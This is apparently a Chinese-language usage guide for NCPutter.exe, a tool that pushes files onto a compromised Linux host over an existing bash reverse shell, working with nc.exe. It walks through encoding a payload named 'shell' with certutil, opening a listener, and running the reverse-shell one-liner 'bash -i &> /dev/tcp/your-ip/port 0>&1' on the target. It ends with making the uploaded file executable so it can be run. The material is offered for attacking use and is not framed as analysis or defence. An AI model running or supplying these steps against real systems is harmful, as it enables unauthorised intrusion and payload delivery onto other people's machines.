NCPutter.exe，用来再只有bash反弹shell的w情况下上传文件至目标主机,需要与nc.exe配合使用.
用法:
1）首先将待发送的文件base64编码,推荐使用windows下自带的certutil.exe工具,例如我要上传至目标linux的文件为shell，
则先使用certutil.exe将shell编码：certutil -encode shell shell_base64,得到shell_base64文件，
2）再用文本编辑器（例如notepad++）打开shell_base64,将第一行与最后一行删除，利用查找替换功能将所有的"\r\n"替换为空,即只让文件留下一行
3)使用我的NCPutter.exe，将它与nc.exe还有处理完毕的shell_base64文件放在同一目录下,执行命令：
    NCPutter -p port -f shell_base64,这里的port就是你的目标机bash shell反弹回来的端口,执行命令后，当出现：
    “If the remote linux bash has been connected to the local nc.exe,press any key.”时，表明本地nc已经打开监听，
    在目标linux中切换到任意可写目录下，执行反弹命令：
    bash -i &> /dev/tcp/你的ip/port 0>&1 
    在本地NCputter.exe窗口中按下任意键即开始传送数据。
4)传送完毕后，关闭NCPutter.exe,重新用nc连接远端反弹bash，在刚刚的目录下会产生result.txt与originalFile两个文件，originalFile即你要穿的原始文件shell，
    chmod u+x originalFileh后就可以运行它啦！
